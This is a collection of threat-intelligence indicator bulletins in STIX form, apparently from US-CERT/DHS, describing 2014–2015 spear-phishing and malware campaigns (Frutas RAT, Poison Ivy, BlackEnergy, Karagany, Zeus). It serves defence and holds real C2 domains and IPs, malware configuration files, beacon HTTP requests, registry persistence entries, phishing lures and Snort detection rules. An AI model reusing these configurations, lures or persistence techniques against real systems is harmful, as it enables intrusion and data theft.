stix:STIX_Header.stix:Title: Spear Phishing Email Contains Frutas RAT
stix:STIX_Header.stix:Description:
On 31 March 2015, a U.S. Government Agency observed several targeted malicious emails with the subject "DoD Intelligence and Security Training Standards". The email contained a malicious attachment named, dodm-3115-11.jar (MD5: 5071cd80f69fa56fe0433a706ade26dc) that was a Frutas remote administration tool (RAT). If successfully installed, the malware communicates with the domain www.apple.ddns.me.uk.
The source email address has previously been assoociated with activity related to the malicious actor tracked as Team 338 and Chili Chi. Some of the actor's tactics, techniques, and procedures were reported in AR-13-10014.

stix:Indicator.indicator:Description:
The source email address has been reported in many malicious email campaigns. The email account is intended to appear like a legitimate email address for a foreign government official. The lure in this email is a ligitimate DOD manual but has been replaced with the Frutas RAT.
----- BEGIN EMAIL HEADER ----- From: [REDACTED] <secretariat.lukash@gmail.com>; To: [REDACTED] Bcc: [REDACTED] Date: Tue Mar 31 07:48:45 GMT 2015 Subject: DoD Intelligence and Security Training Standards Attachment: dodm-3115-11.jar (61194 bytes) ----- END EMAIL HEADER -----
----- BEGIN EMAIL BODY -----
SUBJECT: DoD Intelligence and Security Training Standards References: See Enclosure 1 ----- END EMAIL BODY -----

EmailMessageObj:Header.EmailMessageObj:Subject: DoD Intelligence and Security Training Standards

stix:Indicator.indicator:Description:
If successful, this file executes and installs the Frutas remote administration tool (RAT), a publicly available Java-based RAT that contains several modules for exfiltrating credentials. The RAT configures the registry as follows for persistence: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\iepxlore= C:\Program Files\Java\jre6\bin\javaw.exe -jar C:\Documents and Settings\%USERNAME%\Application Data\Frutas\webclient.jar
It then beacons to www.apple.ddns.me.uk

When the Frutas controller generates the Frutas implant, the configuration file is normally the only part of the Frutas RAT JAR file that changes.
----- BEGIN FILE CONTENTS ----- <?xml version="1.0" encoding="UTF-8" standalone="no"?> <!DOCTYPE properties SYSTEM "http://java.sun.com/dtd/properties.dtd"> <properties> <comment>Frutas rat v0.8</comment> <entry key="prefijo">ndi</entry> <entry key="uac">false</entry> <entry key="delay">3</entry> <entry key="puerto2">995</entry> <entry key="dns">www.apple.ddns.me.uk</entry> <entry key="keyClase">gdUtZJnl</entry> <entry key="puerto1">993</entry> <entry key="jarname">webclient</entry> <entry key="instalar">true</entry> <entry key="hklm">true</entry> <entry key="password">77b5f8e343a90f6f597751021fb8b7a08fe83083</entry> <entry key="tskschedule">false</entry> <entry key="regname">iepxlore</entry> </properties> ----- END FILE CONTENTS -----

stix:STIX_Header.stix:Title: Spear-Phishing Campaign Using "Sec Hagel speech at Air Force Assn (delivered by U/S Frank Kendall)" Themed Emails Containing Malicious Attachment
stix:STIX_Header.stix:Description: On June 1, 2015, US-CERT was notified by a trusted third party of a spear-phishing campaign using "Sec Hagel speech at Air Force Assn (delivered by U/S Frank Kendall)" themed emails containing a malicious attachment.

marking:Marking_Structure.simpleMarking:Statement: This Indicator Bulletin is provided "as is" for informational purposes only. The Department of Homeland Security (DHS) does not provide any warranties of any kind regarding any information contained within. The DHS does not endorse any commercial product or service, referenced in this bulletin or otherwise. This document is marked TLP: AMBER. Recipients may only share TLP: AMBER information with members of their own organization, and only as widely as necessary to act on that information. For more information on the Traffic Light Protocol, see http://www.us-cert.gov/tlp.

stix:Indicator.indicator:Description:
---START EMAIL BODY---
I call your attention to remarks (attached) delivered yesterday by Under Secretary of Defense Frank Kendall at the meeting of the Air Force Assn. Frank delivered remarks prepared for (and by) the Secretary and offered sidebar comments in emphasis. I highlight in yellow on pg 6-7 unusually candid, intense and personal remarks regarding the Secretary's (and Frank's) commitment to the nuclear deterrence mission. Note Frank's use of repetition to emphasize two key points..
Hope you find of interest.
Attached is supported by Adobe version 10.X.
---END EMAIL BODY---

EmailMessageObj:Header.EmailMessageObj:Subject: Sec Hagel speech at Air Force Assn (delivered by U/S Frank Kendall)

stix:Indicator.indicator:Description:
This PDF contains malicious JavaScript that exploits particular versions of Adobe Reader (*NOTE: This exploit worked against Adobe Reader 11.0). File signatures indicate that CVE-2013-0640 or CVE-2013-0641 may have been used as the exploit.
When the exploit is successful it drops and executes DLL "D.T". It pulls out relevant data from the PDF file, and is then decoded and de-obfuscated to reveal and execute shellcode. The shellcode then drops and executes "L2P.T", which will drop and execute "mag2.tmp". Upon successful exploitation, the "D.T" executable is dropped in either of the following files paths, dictated by the version of Adobe Reader installed on the victim, with "L2P.T" eventually dropped in the same directory as "D.T":
C:\Documents and Settings\<user>\Local Settings\Temp\acrord32_sbx C:\Documents and Settings\<user>\Local Settings\Temp\

When run, this DLL attempts to pull out relevant data from the PDF file Kendall-AFA_2015_Conference, and then decodes and deobfuscates it to reveal and execute shellcode. The shellcode would then drop and execute DLL "L2P.T".
This is a DLL file dropper. It contains compressed data in its resource section that decompresses to an executable. Once decompressed and dropped to "%TEMP%/mag2.tmp", the file is executed.

This is an executable file dropper. It contains compressed data in its resource section that decompresses to a DLL, "dropped.exe". Once decompressed, "dropped.exe" is executed in the same memory space as this executable.

This is a DLL file dropper. It is expected to run in the memory space of the file of the parent dropper (hence the generic filename). It will drop a benign PDF and open the PDF to the user. It will also drop a DLL called "sysprep.ocx" and execute the DLL's export function called "RtlShellDecompress". Finally, it drops executable "svchost.exe" in the %APPDATA% directory.
Decoy PDF that's dropped and displayed to the user.

Depending on the OS version, this DLL will either set up a service to run an executable upon reboot, or decompress an executable from its resource section for execution. If the OS version is Windows Vista or above, this file will decompress and run DLL "dropped3.dll" from its resource section in memory. If it's below Vista (e.g., Windows XP), it copies "%APPDATA%\svchost.exe" to "c:\program files\common files\microsoft shared\svchost.exe" and a service is created to run "c:\program files\common files\microsoft shared\svchost.exe". Note that the service doesn't appear to be started initially. The service will run upon reboot, or if started manually by the user. Additionally, shortcuts found in the Quick Launch toolbar will point to "%APPDATA%\svchost.exe". This file is expected to be dropped and executed in %APPDATA% with the filename "sysprep.ocx". If it's located somewhere else or has a different file name, it will not execute properly.

This DLL will attempt to raise the privilege level of "sysprep.ocx". The method used to increase the privilege level uses functions that are only available in Windows Vista and above. This DLL is expected to run in the memory space of the file of the parent dropper (hence the generic filename).

This is an executable file dropper. It contains compressed data in its resource section. The data is decompressed to reveal DLL "dropped2.exe", which is then executed in the same memory space as this file dropper.

This is a DLL file dropper. It is expected to run in the memory space of the file of the parent dropper (hence the generic filename). It contains DLL "extracted.dll" in its resource section. "extracted.dll" is dropped onto the host and is then executed.
This is an implant that makes an initial callout. At some point, this implant is deleted. AKA "phpsend.dll" with exports "RtlShellDecompressLaunch" and "RtlShellQuickLaunch".
HTTP over port 80.

stix:STIX_Header.stix:Title: Command and Control Traffic Observed to a Malicious Domain
stix:STIX_Header.stix:Description: On 17 December 2014, communication was observed on a US Government network to the malicious domain www.videohdshare.com.

stix:Indicator.indicator:Description:
The compromised system sent the following request to the malicious domain, www.videohdshare.com:
GET /hdvideo3.php?uid=[REDACTED] HTTP/1.1 Host: www.videohdshare.com User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: keep-alive

stix:STIX_Header.stix:Title: Custom Malware Implant Used Against a US Company
stix:STIX_Header.stix:Description: On 20 October 2014, attackers used a custom malware implant to maintain access to at least two hosts in the network of a US company via IP addresses 175.111.4.6:443, 140.136.134.109, 142.177.194.101, and 151.13.173.99. The attacker enumerated system data and exfiltrated the data via the custom malware (MD5: ED7A9C6D9FC664AFE2DE2DD165A9338C).

stix:Indicator.indicator:Description:
This file installs the custom malware's implant.
Between approximately 00:39 and 07:16 GMT on 20 October 2014, attackers used a custom implant to maintain access to at least two hosts inside the network of a US company via IP 175.111.4.6 over TCP port 443. This IP was registered in Pakistan. Other IP addresses configured in the malware include 140.136.134.109 (Taiwan), 142.177.194.101 (Canada), and 151.13.173.99 (Italy).
On or around 00:39 GMT, attackers enumerated the first compromised host. The target's hostname, CPU type, and operating system version were identified and shared resources were enumerated. Nine shared resources were mapped to the compromised host at the time of enumeration. A directory listing was performed on one of the nine shared resources, which was then exfiltrated via the custom implant's file transfer capability. 350 directory names and 13 filenames included in the directory walk were exfiltrated in a 20092 byte file. Directory listings of at least four additional paths were also performed.
On or around 07:16 GMT, CNE operators enumerated on a second compromised host. The target's hostname, CPU type, and operating system version were identified. The attacker ran the command "whoami", performed a directory listing on the "C:\" drive, and performed a process list on the system.

According to the report, this custom implant appears to have basic backdoor functionalities. It can fingerprint the compromised machine, run remote commands, perform directory listings, perform process listings, and transfer files.
Implants in this malware family are typically loaded via a dropper, installed as a service, then configured to listen on TCP port 443. The implant may have an associated configuration file which can contain a configurable port. It is unknown if the implant deployed on this compromised network had an associated configuration file. The filenames and service names associated with this malware are likely configurable and different per victim.
This file was also identified as an implant for the custom malware.

stix:STIX_Header.stix:Title: Karagany Malware and C2 Sites Identified
stix:STIX_Header.stix:Description: On 10 September 2014, a financial organization reported this sample of Karagany malware, Ntsys391.exe (MD5: 545244ffcfa9493d130979a11370f0fd). It was first publically seen on 2 March 2014. This information stealing malware calls back to the internet protocol (IP) address 93.171.216.118.

stix:Indicator.indicator:Description:
This malware was identified as Karagany by the reporting source. The malware contains functionality that includes anti-debugging, VMware awareness, information theft, and can function as a plug-in.
The malware modifies the registry entry in the ControlSet at Control\Session Manager\"PendingFileRenameOperations" and checks for the existence of the registry key "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\Enum\0".
The malware copies itself to the current working directory (CWD) as err.log###### (six digits in the name). It hides the file, creates the folder in "%UserProfile%\AppData\Local\" and copies itself to the folder. The malware creates the plugs subdirectory, the file prog.cer, Form.api, and inact.api in this location. A shortcut (.lnk) file is created in the "Start Menu\Programs\Startup\" folder.
The malware executes multiple processes. It runs itself with the ?fst parameter. Every minute, it starts a new thread to run the created executable. It checks for the existence of the VMware registry key "Services\Enum\0". It also checks for files in "%AllUsersProfile%\Mail". The malware sends packages of file text encoded in base64 to the C2 server. The malware creates the directory "%AllUsersProfile%\Mail\MailAg\gl" for file uploads.

The IP 93.171.216.118 was hardcoded in the malware. It has a loopback connection on port 8888.
User-Agent: Opera/10.XX Presto/2.2.30 (The XX changes)

The IP 93.171.216.118 was hardcoded in the malware. It has a loopback connection on port 8888.
User-Agent: Opera/10.XX Presto/2.2.30 (The XX changes)
This location was used for uploads of exfiltrated data.

stix:STIX_Header.stix:Title: Phishing Email Containing a Malicious PowerPoint Attachment
stix:STIX_Header.stix:Description: On 12 November 2014, a government department was targeted with a phishing email that contained a malicious PowerPoint document. If executed, the malicious PowerPoint document attempts to install the Poison Ivy implant and two files. The implant attempts to communicate with ww1.molnews.net over port 80.

Hundetgesen. -- [REDACTED NAME] Counselor, military adviser Permanent Mission of Mongolia to the UN [REDACTED CONTACT INFORMATION] ----- END EMAIL BODY -----

This file is a malicious PowerPoint document that contains the Poison Ivy implant.
The following files are embedded in the PowerPoint file: Slides.inf (MD5: 370A6584927C7FCBE23B2BAC67E4F2CA) Slide1.gif (MD5: 2D6BA3C3D6BEC80D8D935D312315FA72)

The file nomiin ug.pps is a legitimate PowerPoint document that contains the Poison Ivy implant attempting to install this file.
According to the data source report, this file only performs malicious behavior if opened on Windows 7; it will not open on Windows XP machines.
This file renames "slide1.gif" to "slide1.gif.exe" and places the file in the %temp% directory. It then adds itself to the registry using the command "HKLM,Software\Microsoft\Windows\CurrentVersion\RunOnce,Install,,cmd /c start %1%\slide1.gif.exe"

This file renames "slide1.gif" to "slide1.gif.exe" and places the file in the %temp% directory. It then adds itself to the registry using the command: "HKLM,Software\Microsoft\Windows\CurrentVersion\RunOnce,Install,,cmd /c start %1%\slide1.gif.exe"
This enables "slide1.gif.exe" to be installed, placed in the RunOnce registry key, and executed.

This is a Poison Ivy remote administration tool (RAT) that performs a DNS query for the domain "www1.molnews.net". It then attempts to connect to port 80. If successful, data is sent out.
Additional behavioral activity information can be found here: https://www.virustotal.com/en/file/8897c503aa592afb218b4779942e9e769569cf732307a006e7be59ddb29f6836/analysis/

stix:STIX_Header.stix:Title: BlackEnergy Command and Control Sites Used Against SCADA Systems
stix:STIX_Header.stix:Description:
On 7 February 2015, command and control (C2) sites were identified in phishing campaigns against organizations that heavily use Supervisory Control and Data Acquisition (SCADA) systems. The malware was identified as BlackEnergy with three variants that called back to the following IP addresses:
95.143.193.131 37.220.34.56 144.76.119.48
This activity was tracked by one of the reporting sources as Sandworm Team.

stix:Indicator.indicator:Description:
According to an open-source Trend Micro report, the Sandworm Team used spear phishing emails with malicious attachments. The attachments included malicious documents containing exploits for one zero-day vulnerability, while other spear phishing email attachments could exploit two vulnerabilities.
Not relegated to office documents, the Sandworm Team also exploited vulnerabilities in WinRAR software and an Adobe Flash Player installer. Exploited vulnerabilities included CVE-2014-4114, CVE-2010-3333, CVE-2012-0158, CVE-2013-3906, CVE-2014-1761, and OSVDB-62610.
According to Trend Micro, the Russian-related activity referred to as Blacken targeted SCADA users of GE Intelligence Platform's CIMPLICITY Human-Machine Interface (HMI) Solution Suite. The attackers used .cim and .bcl files as exploitation vectors, but there was no evidence of actual manipulation of SCADA systems or devices.
(Source: http://blog.trendmicro.com/trendlabs-security-intelligence/sandworm-to-blacken-the-scada-connection/)
According to a third-party, the Sandworm attackers used tools that communicate over HTTP. Compromised machines called back to IP 95.143.193.131:
POST /aG91c2VhdHJIaWRIczk0/dirconf/check.php HTTP/1.1 Accept: */* Content-Type: application/x-www-form-urlencoded Accept-Language: en-us User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; InfoPath.2) Accept-Encoding: gzip, deflate Host: 95.143.193.131 Content-Length: 72 Connection: Keep-Alive Cache-Control: no-cache id=41997D5249BAC1ADFF28D6F30AC5FC2607BAA486&bid=UHMwOU0=&nm=1&cn=2&num=5
The callback site sent the following communications to the compromised machine:
HTTP/1.1 200 OK Date: Thu, 04 Sep 2014 21:05:02 GMT Server: Apache X-Powered-By: PHP/5.3.3 Content-Length: 128 Connection: close Content-Type: text/html; charset=UTF-8 0jhSzmPHQDqju0BBm89qh48pCLgLO1VW24Cfe34NHAb88zaK2qlDeFxcacprohi4uq1Ji8MEUPLsYin5FW007iHNVdtWT9C5NpVvgmlixIHhpTIp4PxliWKzyi3XXOI=
According to a third-party report, the Sandworm Team used at least two variants of the BlackEnergy Trojan appropriately dubbed BlackEnergy2 and BlackEnergy3. The variant BlackEnergy3 is also known as BlackEnergy Lite. Distinguished by its rootkit and plug-in architecture, BlackEnergy2 was observed in the wild since at least 2008. Many plug-ins were associated with BlackEnergy2 including spam, DDoS capability, and financial credential theft.

The BlackEnergy2 variant can be identified by its use of a configuration file in the following format, along with the use of a kernel driver:
<bkernel> <servers> <server> <type>https</type> <addr>https://37.220.34.56/siteproperties/viewframes/dialog.php</addr> </server> <server> <type>gid</type> <addr>116769597454024178039</addr> </server> </servers> <cmds> </cmds> <sleepfreq>600</sleepfreq> <build_id>0E0611peu</build_id> </bkernel>
While the BlackEnergy3 malware does not have a rootkit, the Sandworm Team is known to use it. The malware is recognized by the following configuration file. Variables were denoted in [brackets]:
{"[C2 site]": "http://95.143.193.131/aG91c2VhdHJIaWRIczk0/dirconf/check.php," "[variable code]": "xVidRt," "[variable u1]": "," "sleep": "600," "u2": ""}

A potential third variant is similar to BlackEnergy2, differing primarily by the absence of XML in the configuration file:
https://144.76.119.48/YXJyYWtpczAy/loadvers/paramctrl.php;proxy=https=10.15.100.200:3128
According to Trend Micro, in order to target victims, the Sandworm Team uses spear phishing emails with malicious attachments. The attachments can include documents exploiting a zero-day vulnerability and other spear phishing emails that can exploit two vulnerabilities. Not relegated to documents alone, Sandworm Team also leveraged a vulnerability in WinRAR software and an Adobe Flash Player installer. Exploited vulnerabilities included CVE-2014-4114, CVE-2010-3333, CVE-2012-0158, CVE-2013-3906, CVE-2014-1761 and OSVDB-62610.
According to Trend Micro, most research indicates the attackers targeted organizations who rely on SCADA systems, particularly GE Intelligence Platform's CIMPLICITY Human-Machine Interface (HMI) Solution Suite. Attackers used .cim and .bcl files as attack vectors; however, actual manipulation of SCADA systems or devices were not observed.
According to Trend Micro, the Sandworm Team primarily targeted near-abroad entities to include telecommunications and energy sectors, although the attackers could potentially use the BlackEnergy3 Trojan against other targets.
Sandworm-associated malware can be detected with the following SNORT rules:
alert tcp any any -> any 80 (msg:"Sandworm Implant Beacon"; content:"=&nm=1&";pcre:"/id=[0-9A-Z]{40}&bid=[a-zA-Z0-9]{5,8}&nm=1&cn=[0-9]&num=[0-9]/";) alert tcp any any -> any 80 (msg:"Sandworm Implant Beacon Var 2"; content:"User-Agent: iexplorer8.0";)
For additional reporting regarding the SCADA targeting, see Trend Micro's 'Sandworm to Blacken: The SCADA Connection' Security Intelligence Blog [10/16/14] (http://blog.trendmicro.com/trendlabs-security-intelligence/sandworm-to-blacken-the-scada-connection/)

stix:STIX_Header.stix:Title: Spam Emails Sent Via Possible Open Mail Relay
stix:STIX_Header.stix:Description:
An energy sector organization reported observing spam emails sent to valid email addresses for two employees on 21 October 2014. The emails had a Subject of PREORDER and a file attachment named 20140192.zip. The data source reported three additional attempts sent to an invalid user, a former employee, and an invalid email address for a current employee.
Initial malware triage by the reporting organization using a commercial sandbox identified the malware contained in the malicious attachments as a banking trojan Zeus/Zbot variant.
The IP address 49.212.34.94 may host a misconfigured or compromised mail server acting as an open mail relay for actors sending spam.

stix:Indicator.indicator:Description:
---- BEGIN EMAIL HEADERS ---- EHLO mail.taikoh-kyoto.co.jp MAIL FROM:<preorder2014sumitomo@gmail.com> RCPT TO:<[redacted]> DATA Received: from [173.208.195.149] (unknown [173.208.195.149]) by mail.taikoh-kyoto.co.jp (Postfix) with ESMTPSA id E49F99882ED; Wed, 22 Oct 2014 00:00:46 +0900 (JST) Content-Type: multipart/mixed; boundary="===============1951627353==" MIME-Version: 1.0 Subject: PREORDER To: Recipients <preorder2014sumitomo@gmail.com> From: preorder2014sumitomo@gmail.com Date: Tue, 21 Oct 2014 08:00:05 -0700 ---- END EMAIL HEADERS ---- ---- BEGIN EMAIL BODY ---- Dear Sir, Please find attached our order,view and send qotation urgently.
Thanks and Regards.
Mrs sui lang
Purchasing manager, Sumitomo corporation ---- END EMAIL BODY ----

A review of logs by the organization revealed an additional 180 emails in the preceding 90 days from the IP address 49.212.34.9.
Some subjects for those emails included: PREORDER END OF YEAR AWARD 2014 AWARD GOOGLE AWARD Dear Beloved INSTRUCTION TO RELEASE YOUR INHERITANCE FUND Dearest in Christ..!! Investment Partner Needed. FROM MR JAMES EDWARD YOUR PAYMENT VIA CBN-VISA DEBIT CARD1111 AWARD 2014 URGENT FROM DR.MARK JOHN ATTN: Sir /Madam very urgent OK
The IP address 49.212.34.94 may host a misconfigured or compromised mail server acting as an open mail relay for actors sending spam.
According to a search on DomainTools (http://whois.domaintools.com/49.212.34.94)

172785s (1.23:59:45) 34.212.49.in-addr.arpa IN NSEC next domain name: 35.212.49.in-addr.arpa record types: NS RRSIG NSEC 172785s (1.23:59:45) 34.212.49.in-addr.arpa IN NS ns2.dns.ne.jp 3600s (01:00:00) 34.212.49.in-addr.arpa IN NS ns1.dns.ne.jp 3600s (01:00:00)
-- end --

The executable contained in the malicious attachment was identified by malware analysis as a Zeus variant banking trojan.
During installation a randomly named copy of the Zeus executable will be copied from %temp% to %appdata%. Example:
%appdata%\Wawio\mytyy.exe
The Zeus variant observed in the spam emails may perform keylogging and web-browser code injection to harvest banking credentials and other information.

The malicious process attempts to check network connectivity by attempting to send an HTTP GET request to http://www.google.com:80/webhp
If successful the malware will attempt to communicate via HTTP GET and POST requests to a command and control server (C2) hosted at URL http://professionaljewelrymerchandising.com:80/dodorima/config.bin
The C2 for the botnet is resolved via fast-flux DNS with A record TTLs of 600S. Mitigations or detections via a resolved IP are unlikely to be effective.

stix:STIX_Header.stix:Title: Spear-Phishing Emails Using "DPRK draft res. - blue (E)" Theme Containing Malicious Attachment
stix:STIX_Header.stix:Description: On April 15, 2015, US-CERT was notified by a trusted third party of a spear-phishing campaign using "DPRK draft res. - blue (E)" themed email containing a malicious attachment.

marking:Marking_Structure.simpleMarking:Statement: This Indicator Bulletin is provided "as is" for informational purposes only. The Department of Homeland Security (DHS) does not provide any warranties of any kind regarding any information contained within. The DHS does not endorse any commercial product or service, referenced in this bulletin or otherwise. This document is marked TLP: AMBER. Recipients may only share TLP: AMBER information with members of their own organization, and only as widely as necessary to act on that information. For more information on the Traffic Light Protocol, see http://www.us-cert.gov/tlp.

stix:Indicator.indicator:Description:
The message contained an Adobe Portable Document Format (.pdf) file designed to exploit vulnerabilities described in CVE-2013-0640. When the .pdf file is executed, three files are written to the user?s %Temp% folder: "L2P.T", "D.T", and "mag14D.tmp". The "mag14D.tmp" is then executed via command line, which also writes a benign decoy document, "031115 DPRK draft res. - blue (E).pdf" to %Temp%. "Mag14D.tmp" writes "svchost.exe" and "sysprep.ocx" to the user?s %APPDATA% folder. The malicious file "svchost.exe" is then copied to C:\Program Files\Common Files\Microsoft Shared\. The following files are deleted prior to "mag14D.tmp" terminating: "L2P.T", "D.T", and "sysprep.ocx".
In order to maintain persistence on the compromised system, the malicious software (malware) creates a new service, Windows Firewall Sysprep, which points to the "svchost.exe" located in C:\Program Files\Common Files\Microsoft Shared\. This service is created in a "Stopped" status, and the malware does not call out until the service is started either manually or upon system reboot. Once the service is started, "svchost.exe" writes "sysprepwo.ocx" to C:\Program Files\Common files, and utilizes "rundll32.exe" to load "sysprepwo.ocx" with the export ?RtlShellDecompressLaunch?. Testing in a virtual environment shows that after calling out, "rundll32.exe" is terminated and "sysprepwo.ocx" is deleted from the system. This .ocx file contains the callout information for the malware, and initiates command and control (C2) communication with the following initial GET request: GET /test.php?filename=[base64]hostname&data=[base64]location and service pack.
Benign dropped document.

stix:STIX_Header.stix:Title: Persian Character Phishing Email Contains OutlookExpress Automatic Updates Trojan
stix:STIX_Header.stix:Description:
On 10 November 2014 a U.S. government department observed phishing email attempts from the address habib.kohbandi@gmail.com, with the subject ????? ??? ??? and carrying the malicious attachment named ???????????? 11 ??????2014.doc (MD5 D6C56083776E2E63A970FA11083FC92B).
If successfully installed, the malware attempts to contact a command and control (C2) server at http://kentawp.3322.org:8081.

stix:Indicator.indicator:Description:
----- START EMAIL HEADER ----- Received: by mail-pa0-f66.google.com with SMTP id rd3so5488976pab.1 for <[REDACTED]>; Mon, 10 Nov 2014 17:46:56 -0800 (PST) DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=gmail.com; s=20120113; h=from:message-id:date:user-agent:mime-version:to:subject :content-type; bh=RqT0mTtAAz3/GUeN3AMeiUtdm3+MGCwUD/ibFoXR9ns=; b=NqaFzxtcGyoZIHx8r7L5/pFa3cLtEWekIpmVx2xd8xbJ0i6stgp3ctJ/2eLfjPn9RM
o3MEnPGLrfpXBzMD2fWRXa86vdGtU+ynyb/ckqtMAf0FJtzQ4ZfUVGUxdcqqbT+85DAd bn7MMLDUt7X0q1XSzZ87o3WdIjQsoKiIiEKwhIT+q3E17xp5eVxr3hxhnj9MkbOUqcbn
vPxmAndPsd3hz3jS6vxBizLvcVMzN8Myq17p8JJMk2bSuNke8XDE90MRIULoH0tXx5V5 ssLMt162ehQC0WeZXI/h20m9d2GqoV5POJxvag4bEwpQZnEVl3n15/C2fn//nEWyCo47 UM+w== X-Received: by 10.66.157.4 with SMTP id wi4mr4634896pab.63.1415670416307; Mon, 10 Nov 2014 17:46:56 -0800 (PST) Return-Path: <habib.kohbandi@gmail.com> Received: from [192.168.74.129] ([98.126.46.39]) by mx.google.com with ESMTPSA id fk10sm17698968pdb.49.2014.11.10.17.46.51 for <multiple recipients> (version=TLSv1 cipher=ECDHE-RSA-RC4-SHA bits=128/128); Mon, 10 Nov 2014 17:46:55 -0800 (PST) From: [REDACTED NAME] <habib.kohbandi@gmail.com> X-Google-Original-From: [REDACTED NAME] <Habib.Kohbandi@gmail.com> Message-ID: <54616B3A.9020404@gmail.com> Date: Tue, 11 Nov 2014 04:49:46 +0300 User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:24.0) Gecko/20100101 Thunderbird/24.4.0 MIME-Version: 1.0 To: <Multiple recipients including [REDACTED]> Subject: اخبار مهم روز Content-Type: multipart/mixed; boundary="------------030202040108020709050003" This is a multi-part message in MIME format. --------------030202040108020709050003 Content-Type: text/plain; charset=UTF-8; format=flowed Content-Transfer-Encoding: 7bit ----- END EMAIL HEADER ----- The email body was blank.

اخبارانگلیسی 11 نوامبر2014.doc
Machine Translation: "English News November 11 2014.doc"
The malicious attachment, when opened with Microsoft Word, attempts to exploit CVE-2012-0158. If successful it creates updater.exe in the victim's %startup% to ensure it will be executed on next logon by the victim.

The file creates and executes the batch script "msdgptcv.bat" (MD5 02F74712EF3B696CA93076429F4CDCF3) in %appdata%. It then copies itself to C:\Program Files\Outlook Express with the filename msiug50.exe, and a modified time-date stamp. The file then creates and executes the batch file Demonr.bat before terminating.
The IMAGE_NT_HEADERS TimeDateStamp for updater.exe is 09/05/2014 06:18:05 and msiug50.exe is 09/05/2014 06:13:49.

The file creates a temporary file DefOpen.reg in the user's Temp directory to hold the Registry modification to create the "Windows Management OutlookExpress Automatic Updates" service. It executes the regedit command to modify the System Registry with those changes. It then deletes the temporary file DefOpen.reg and itself.
Registry Keys added: ---------------------------------- HKLM\SYSTEM\ControlSet001\Services\0utlkUpd HKLM\SYSTEM\CurrentControlSet\Services\0utlkUpd Registry Values added: ---------------------------------- HKLM\SYSTEM\ControlSet001\Services\0utlkUpd\Type: 0x00000110 HKLM\SYSTEM\ControlSet001\Services\0utlkUpd\Start: 0x00000002 HKLM\SYSTEM\ControlSet001\Services\0utlkUpd\ErrorControl: 0x00000001 HKLM\SYSTEM\ControlSet001\Services\0utlkUpd\ImagePath: "C:\Program Files\Outlook Express\msiug50.exe" HKLM\SYSTEM\ControlSet001\Services\0utlkUpd\DisplayName: "Windows Management OutlookExpress Automatic Updates" HKLM\SYSTEM\ControlSet001\Services\0utlkUpd\ObjectName: "LocalSystem" HKLM\SYSTEM\ControlSet001\Services\0utlkUpd\Description: "Provides a common interface and object model to access Automatic Updates management information about Outlook Express modules. If this service is stopped, most Outlook updates will not function properly. If this service is disabled, any services that explicitly depend on it will fail to start." HKLM\SYSTEM\CurrentControlSet\Services\0utlkUpd\Type: 0x00000110 HKLM\SYSTEM\CurrentControlSet\Services\0utlkUpd\Start: 0x00000002 HKLM\SYSTEM\CurrentControlSet\Services\0utlkUpd\ErrorControl: 0x00000001 HKLM\SYSTEM\CurrentControlSet\Services\0utlkUpd\ImagePath: "C:\Program Files\Outlook Express\msiug50.exe" HKLM\SYSTEM\CurrentControlSet\Services\0utlkUpd\DisplayName: "Windows Management OutlookExpress Automatic Updates" HKLM\SYSTEM\CurrentControlSet\Services\0utlkUpd\ObjectName: "LocalSystem" HKLM\SYSTEM\CurrentControlSet\Services\0utlkUpd\Description: "Provides a common interface and object model to access Automatic Updates management information about Outlook Express modules. If this service is stopped, most Outlook updates will not function properly. If this service is disabled, any services that explicitly depend on it will fail to start." HKU\S-1-5-21-1417001333-1275210071-839522115-500\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell: "Explorer.exe,C:\Program Files\Outlook Express\msiug50.exe"

msdgptcv.bat modifies the registry to ensure persistence:
HKU\S-1-5-21-1417001333-1275210071-839522115-500\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell: "Explorer.exe,C:\Program Files\Outlook Express\msiug50.exe"
Note:"S-1-5-21-1417001333-1275210071-839522115-500" will vary by user and is provided as an example.

HKLM\SYSTEM\ControlSet001\Services\0utlkUpd\Type: 0x00000110 HKLM\SYSTEM\ControlSet001\Services\0utlkUpd\Start: 0x00000002 HKLM\SYSTEM\ControlSet001\Services\0utlkUpd\ErrorControl: 0x00000001 HKLM\SYSTEM\ControlSet001\Services\0utlkUpd\ImagePath: "C:\Program Files\Outlook Express\msiug50.exe" HKLM\SYSTEM\ControlSet001\Services\0utlkUpd\DisplayName: "Windows Management OutlookExpress Automatic Updates" HKLM\SYSTEM\ControlSet001\Services\0utlkUpd\ObjectName: "LocalSystem" HKLM\SYSTEM\ControlSet001\Services\0utlkUpd\Description: "Provides a common interface and object model to access Automatic Updates management information about Outlook Express modules. If this service is stopped, most Outlook updates will not function properly. If this service is disabled, any services that explicitly depend on it will fail to start."

HKLM\SYSTEM\CurrentControlSet\Services\0utlkUpd\Type: 0x00000110 HKLM\SYSTEM\CurrentControlSet\Services\0utlkUpd\Start: 0x00000002 HKLM\SYSTEM\CurrentControlSet\Services\0utlkUpd\ErrorControl: 0x00000001 HKLM\SYSTEM\CurrentControlSet\Services\0utlkUpd\ImagePath: "C:\Program Files\Outlook Express\msiug50.exe" HKLM\SYSTEM\CurrentControlSet\Services\0utlkUpd\DisplayName: "Windows Management OutlookExpress Automatic Updates" HKLM\SYSTEM\CurrentControlSet\Services\0utlkUpd\ObjectName: "LocalSystem" HKLM\SYSTEM\CurrentControlSet\Services\0utlkUpd\Description: "Provides a common interface and object model to access Automatic Updates management information about Outlook Express modules. If this service is stopped, most Outlook updates will not function properly. If this service is disabled, any services that explicitly depend on it will fail to start."
When this batch cleanup script is executed, it deletes the file updater.exe from the user's Startup folder, then deletes itself.
When this file is executed, it starts a new instance of svchost.exe and injects malicious code into the svchost.exe process space, then terminates.

The injected Svchost.exe was observed attempting to report to a command and control server compromised host information such as Computer Host Name, Compromised User Name, and Operating System.
The injected process first is observed making a DNS Request (port 53) attempting to resolve kentawp.3322.org. Then the injected process attempts to contact the resolved IP address via HTTP, TCP destination port 8081.
Traffic continues approximately every 25 seconds
